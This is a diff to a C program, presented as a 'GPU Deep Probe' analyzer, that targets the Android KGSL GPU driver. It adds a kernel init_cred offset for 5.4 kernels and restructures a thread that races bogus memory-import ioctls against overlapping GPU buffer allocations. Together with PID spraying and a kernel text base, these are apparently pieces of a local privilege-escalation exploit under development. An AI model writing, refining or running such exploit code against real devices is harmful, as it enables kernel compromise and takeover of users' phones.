@@ -84,6 +84,7 @@ struct kgsl_cmdstream_readtimestamp_ctxtid { unsigned int context_id, type, time
 
 #define SPRAY_PIDS 2000
 #define VMLINUX_TEXT 0xffffffc010080000ULL
+#define VMLINUX_INIT_CRED 0x26fa738  // approximate offset for 5.4 kernels
 
 static int kgsl_fd = -1;
 static volatile int dc_civac_works = -1;
@@ -338,6 +339,19 @@ static void test_write_dst(uint64_t dst_ga, uint64_t *dst_m) {
     gpuobj_free(ib_id);
 }
 
+static void *race_thread(void *arg) {
+    volatile int *done = (volatile int *)arg;
+    struct kgsl_gpuobj_import_useraddr uaddr = { .virtaddr = BOGUS_ADDR };
+    struct kgsl_gpuobj_import imp = {
+        .priv = (uint64_t)&uaddr,
+        .priv_len = BOGUS_SIZE,
+        .flags = KGSL_MEMFLAGS_USE_CPU_MAP,
+        .type = KGSL_USER_MEM_TYPE_ADDR,
+    };
+    while (!*done) ioctl(kgsl_fd, IOCTL_KGSL_GPUOBJ_IMPORT, &imp);
+    return NULL;
+}
+
 int main(int argc, char **argv) {
     setbuf(stdout, NULL);
     printf("=== ULTRA ANALYZER v2 — GPU Deep Probe ===\n\n");
@@ -443,18 +457,7 @@ int main(int argc, char **argv) {
     printf("[*] Attempting to create race condition (import thread)...\n");
     volatile int race_done = 0;
     pthread_t thr;
-    struct kgsl_gpuobj_import_useraddr uaddr2 = { .virtaddr = BOGUS_ADDR };
-    struct kgsl_gpuobj_import imp2 = {
-        .priv = (uint64_t)&uaddr2,
-        .priv_len = BOGUS_SIZE,
-        .flags = KGSL_MEMFLAGS_USE_CPU_MAP,
-        .type = KGSL_USER_MEM_TYPE_ADDR,
-    };
-    void *race_thread(void *arg) {
-        while (!race_done) ioctl(kgsl_fd, IOCTL_KGSL_GPUOBJ_IMPORT, &imp2);
-        return NULL;
-    }
-    if (pthread_create(&thr, NULL, race_thread, NULL) == 0) {
+    if (pthread_create(&thr, NULL, race_thread, (void*)&race_done) == 0) {
         int ov_id = gpuobj_alloc(OVERLAP_SIZE, KGSL_MEMFLAGS_USE_CPU_MAP | KGSL_CACHEMODE_WRITEBACK);
         int hit = 0;
         for (int i=0; i<1000000; i++) {
